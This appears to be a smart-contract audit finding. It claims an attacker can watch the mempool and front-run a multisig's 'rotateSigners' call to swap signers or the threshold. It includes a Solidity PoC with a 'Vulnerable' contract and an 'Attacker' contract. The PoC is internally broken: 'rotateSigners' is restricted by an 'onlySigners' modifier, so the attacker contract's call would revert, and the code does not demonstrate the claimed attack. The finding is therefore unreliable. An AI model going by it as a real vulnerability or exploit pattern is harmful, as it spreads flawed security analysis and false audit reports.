# Vulnerability details

An attacker might be able to see an upcoming rotateSigners transaction in the mempool and then execute a front-running transaction to manipulate the signers or threshold.

Step 1: An attacker monitors the mempool for pending transactions involving rotateSigners.
Step 2: The attacker notices a transaction that changes the signers and threshold. The attacker can submit their transaction that also calls rotateSigners with a modified list of signers or threshold.
Step 3: The attacker can manipulate the timing or order to ensure that their transaction is mined first, potentially altering the signers and threshold before the original transaction completes.

PoC:

Vulnerable Contract
```
pragma solidity ^0.8.0;

contract Vulnerable {
    address[] public accounts;
    uint256 public threshold;
    uint256 public signerEpoch;

    mapping(address => bool) public isSigner;
    
    modifier onlySigners() {
        // Only allow current signers to execute
        require(isSigner[msg.sender], "Not a signer");
        _;
    }

    function rotateSigners(address[] memory newAccounts, uint256 newThreshold) external onlySigners {
        _rotateSigners(newAccounts, newThreshold);
    }

    function _rotateSigners(address[] memory newAccounts, uint256 newThreshold) internal {
        uint256 length = accounts.length;

        // Clean up old signers.
        for (uint256 i; i < length; ++i) {
            delete isSigner[accounts[i]];
        }

        length = newAccounts.length;

        if (newThreshold > length) revert("InvalidSigners");
        if (newThreshold == 0) revert("InvalidSignerThreshold");

        ++signerEpoch;

        accounts = newAccounts;
        threshold = newThreshold;

        for (uint256 i; i < length; ++i) {
            address account = newAccounts[i];
            if (isSigner[account]) revert("DuplicateSigner");
            if (account == address(0)) revert("InvalidSigners");
            isSigner[account] = true;
        }

        emit SignersRotated(newAccounts, newThreshold);
    }

    event SignersRotated(address[] newAccounts, uint256 newThreshold);
}

```

Attacker contract
```
pragma solidity ^0.8.0;

contract Attacker {
    Vulnerable public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = Vulnerable(_vulnerableContract);
    }

    function attack(address[] memory newSigners, uint256 newThreshold) external {
        // Attacker's logic to manipulate signers and threshold
        vulnerableContract.rotateSigners(newSigners, newThreshold);
    }
}
```
